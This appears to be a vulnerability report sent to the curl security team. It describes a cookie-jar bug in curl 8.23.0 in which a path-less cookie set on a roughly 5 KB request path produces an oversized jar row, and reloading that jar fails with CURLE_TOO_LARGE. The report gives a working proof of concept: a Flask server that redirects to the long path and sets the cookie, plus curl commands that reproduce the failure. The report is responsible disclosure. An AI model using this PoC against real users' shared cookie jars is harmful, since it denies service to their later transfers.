  "vulnerability_information": "Hello curl security team,\n\nI am reporting a related cookie-jar failure that I reproduced on the official curl 8.23.0 release.\n\n## Summary\n\nA server redirects curl to a path approximately 5 KB long and responds there with a short cookie that has no `Path` attribute. curl derives the cookie path from the request URL and writes it to the Netscape cookie jar. The resulting record is 5,047 bytes, excluding the newline. A later curl invocation using that jar exits with error 100 (`CURLE_TOO_LARGE`) before sending its request.\n\n## Vulnerable code\n\nIn `lib/cookie.c`, `storecookie()` derives a default path from the request path when a cookie omits the `Path` attribute:\n\n```cpp\nelse if(path) {\n  /* No path was given in the header line, set the default */\n  const char *endslash = strrchr(path, '/');\n  if(endslash)\n    plen = endslash - path + 1; /* include end slash */\n  else\n    plen = strlen(path);\n}\n\nif(path) {\n  co->path = sanitize_cookie_path(path, plen);\n```\n\n`get_netscape_format()` serializes `co->path` into the Netscape cookie-jar row. The serializer does not enforce the maximum line length used by the reader:\n\n```cpp\nreturn curl_maprintf(\n  \"%s%s\\t\"           /* domain */\n  \"%s\\t\"             /* tailmatch */\n  \"%s\\t\"             /* path */\n  \"%s\\t\"             /* secure */\n  \"%\" FMT_OFF_T \"\\t\" /* expires */\n  \"%s\\t\"             /* name */\n  \"%s\",              /* value */\n  ...\n  co->path ? co->path : \"/\",\n  ...);\n```\n\nOn reload, `cookie_load()` initializes its line buffer to `MAX_COOKIE_LINE + 48`, or 5,048 bytes:\n\n```cpp\ncurlx_dyn_init(&buf, MAX_COOKIE_LINE + 48);\n```\n\n`Curl_get_line()` appends the newline to the line buffer. The dynamic buffer also reserves space for a terminating NUL; if the required size exceeds the configured limit, it returns `CURLE_TOO_LARGE`:\n\n```cpp\nsize_t fit = len + idx + 1; /* new string + old string + zero byte */\nif(fit > s->toobig) {\n  curlx_dyn_free(s);\n  return CURLE_TOO_LARGE;\n}\n```\n\nThis creates a mismatch between serialization and parsing: a cookie path can make the serialized row longer than the reader's buffer can \naccept. When the reader exceeds that limit, it returns `CURLE_TOO_LARGE` and the cookie-jar load fails.\n\n## POC\n\nStep 1: Create a simple server and run:\n\n```python\nfrom flask import Flask, abort, make_response, redirect\n\napp = Flask(__name__)\nlong_path = \"/\" + \"p\" * 5015 + \"/abc\"\n\n@app.get(\"/redir\")\ndef redir():\n    return redirect(long_path)\n\n@app.get(\"/<path:path>\")\ndef set_cookies(path):\n    if \"/\" + path != long_path:\n        abort(404)\n    response = make_response()\n    response.set_cookie(\"root\", \"available\", path=\"/\")\n    response.set_cookie(\"long\", \"v\", path=None)\n    return response\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=8000, debug=False, threaded=True)\n```\n\n{F7031492}\n\nStep 2: Use latest 8.23.0 curl to send request to get cookie. This also creates a jar file contains a 5,047-byte row for `long=v` and a 40-byte row for `root=available`\n\n```bash\n./curl -L -b \"\" -c cookies.txt http://127.0.0.1:8000/redir\n```\n\n{F7031728}\n\nStep 3: curl exits with error 100 (`CURLE_TOO_LARGE`) while loading the jar\n\n```bash\n./curl -b cookies.txt http://127.0.0.1:8000               \n```\n\n{F7031739}\n\n## Impact\n\nThe demonstrated impact is denial of service for later curl transfers that load the affected jar. Cookie loading fails before the new HTTP request is sent. Applications that share a persistent jar may see otherwise unrelated transfers fail until the oversized row is removed or the jar is replaced.",
